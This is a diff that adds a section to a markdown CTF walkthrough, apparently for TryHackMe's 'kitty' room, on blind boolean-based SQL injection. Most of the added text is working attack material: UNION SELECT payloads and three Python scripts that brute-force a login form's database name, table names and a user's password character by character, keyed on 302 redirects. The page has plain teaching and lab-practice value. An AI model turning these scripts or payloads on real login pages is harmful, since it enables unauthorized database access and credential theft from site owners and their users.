@@ -1185,6 +1185,191 @@ Table: flag
 
 Just like before, using SQLMap to dump the data makes it really easy.
 
+### Blind/Time -  Python Script Method <a href="#flag-2---blindtime---sqlmap-method" id="flag-2---blindtime---sqlmap-method"></a>
+
+**Examples**
+
+[#ee3c](../../walkthroughs/tryhackme/kitty.md#ee3c "mention")
+
+So, the plan is to know the name of the database. However, manual attempts will be terribly time-consuming, so I decided to practice scripting. After some time spent trying different payloads, this one worked:
+
+**Statement**
+
+```
+' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY 'a%' -- -
+```
+
+
+
+Was able to get the database name using this script
+
+**Kali**
+
+```
+git clone https://github.com/Sonat55/Boolean-Based-SQLI-attacks-helper---for-CTF.git
+cd Boolean-Based-SQLI-attacks-helper---for-CTF/
+```
+
+**script.py**
+
+```
+import sys
+import requests
+
+def sqli(ip):
+    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
+    tmp = ""
+
+    while True:
+        for i in symbols:
+            post= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
+            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
+            status_code=req.status_code
+            print(f"{i}", end='\r')
+            if status_code == 302:
+                tmp += i
+                print(tmp)
+                break
+            elif i == " " :
+                print("\n[#] Attack compleated B)")
+                print(f"DB_NAME: {tmp}")
+                exit()
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <ip>" % sys.argv[0])
+        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
+        return
+    url = sys.argv[1]
+    print("(+) Retrieving database..")
+    sqli(url)
+
+if __name__ == "__main__":
+    main()
+
+```
+
+**Kali**
+
+```
+python script.py $VICTIM
+```
+
+## Table enumeration <a href="#e78c" id="e78c"></a>
+
+**Statement**
+
+```
+' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY 'a%' -- -
+```
+
+**script.py**
+
+```
+import sys
+import requests
+
+def sqli(ip):
+    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
+    tmp = ""
+
+    while True:
+        for i in symbols:
+            post= {"username":f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
+            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
+            status_code=req.status_code
+            print(f"{i}", end='\r')
+            if status_code == 302:
+                tmp += i
+                print(tmp)
+                break
+            elif i == " " :
+                print("\n[#] Attack complete:")
+                print(f"TABLE_NAME: {tmp}")
+                exit()
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <ip>" % sys.argv[0])
+        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
+        return
+    url = sys.argv[1]
+    print("(+) Retrieving database..")
+    sqli(url)
+
+if __name__ == "__main__":
+    main()
+
+```
+
+**Kali**
+
+```
+python script.py $VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>
+
+## Password enumeration <a href="#adc0" id="adc0"></a>
+
+We already know the username “kitty,” so let’s go straight to the password.
+
+**Statement**
+
+```
+' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY 'a%';-- -
+```
+
+**script.py**
+
+```
+import sys
+import requests
+
+def sqli(ip):
+    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
+    tmp = ""
+
+    while True:
+        for i in symbols:
+            post= {"username":f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY '{tmp+i}%' -- -","password":"doesntmatter"} #u can change this for other prposes
+            req = requests.post(f"http://{ip}/index.php", data=post,allow_redirects=False) #address can also be chnaged 
+            status_code=req.status_code
+            print(f"{i}", end='\r')
+            if status_code == 302:
+                tmp += i
+                print(tmp)
+                break
+            elif i == " " :
+                print("\n[#] Attack complete:")
+                print(f"Password:: {tmp}")
+                exit()
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <ip>" % sys.argv[0])
+        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
+        return
+    url = sys.argv[1]
+    print("(+) Retrieving database..")
+    sqli(url)
+
+if __name__ == "__main__":
+    main()
+
+```
+
+**Kali**
+
+```
+python script.py $VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>
+
 ### Out-of-band - Browser Method <a href="#flag-4---out-of-band---browser-method" id="flag-4---out-of-band---browser-method"></a>
 
 I’ve left flag four till last as it’s the hardest to understand. We have another hint, this time is says:
